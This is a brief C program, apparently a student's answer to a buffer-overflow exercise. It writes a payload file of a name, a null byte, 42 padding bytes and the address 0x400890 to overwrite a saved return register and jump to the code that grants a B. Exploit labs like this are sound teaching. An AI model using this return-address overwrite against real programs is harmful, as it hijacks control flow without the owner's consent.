/*
 * Produces a file called dataB with the student name, a null byte, 
 * padding to overrun the stack, and the address of the instruction 
 * in main to get a B, the latter of which will overwrite getName's 
 * stored x30.
 */

#include <stdio.h>
#include <stdint.h>

/*
 * Writes binary data to dataB file to exploit buffer overflow.
 * Takes no command line arguments, reads nothing from stdin,
 * writes attack data to dataB file, writes nothing to stdout,
 * returns 0 on success.
 */
int main(void) {
    FILE *fp = fopen("dataB", "wb");
    
    /* name */
    fwrite("Kevin", 1, 5, fp);
    
    /* null terminator */
    fputc('\0', fp);
    
    /* padding to fill remaining buf space (48 - 6 = 42 bytes) */
    for (int i = 0; i < 42; i++) {
        fputc('A', fp);  /* Arbitrary padding character */
    }
    
    /* Write target address 0x400890 in little-endian format */
    uint64_t target_addr = 0x400890;
    fwrite(&target_addr, sizeof(target_addr), 1, fp);
    
    fclose(fp);
    return 0;
}